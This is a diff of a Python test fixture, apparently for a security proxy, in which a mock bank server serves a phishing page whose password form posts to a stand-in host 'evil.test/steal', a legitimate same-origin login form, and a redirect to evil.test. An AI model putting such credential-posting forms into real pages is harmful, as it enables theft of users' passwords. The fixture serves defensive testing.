@@ -58,8 +58,17 @@ class Upstream:
         if request.url.path == "/balance":
             body = {"account": "DE00 0000 0000 0042", "balance": 1234.56, "currency": "EUR"}
             return JSONResponse(body, headers=bank)
-        if request.url.path == "/phish":  # a response with an injected password form
-            html = "<html><body><form><input type='password' name='pw'></form></body></html>"
+        if request.url.path == "/phish":  # a form that posts credentials to a foreign host
+            html = (
+                "<html><body><form action='https://evil.test/steal'>"
+                "<input type='password' name='pw'></form></body></html>"
+            )
+            return Response(html, 200, media_type="text/html")
+        if request.url.path == "/loginpage":  # the bank's own same-origin login form (legitimate)
+            html = (
+                "<html><body><form action='/transaction/login' method='post'>"
+                "<input type='password' name='password'></form></body></html>"
+            )
             return Response(html, 200, media_type="text/html")
         if request.url.path == "/go":  # a redirect to a foreign host
             return Response("", 302, headers={"location": "https://evil.test/"})
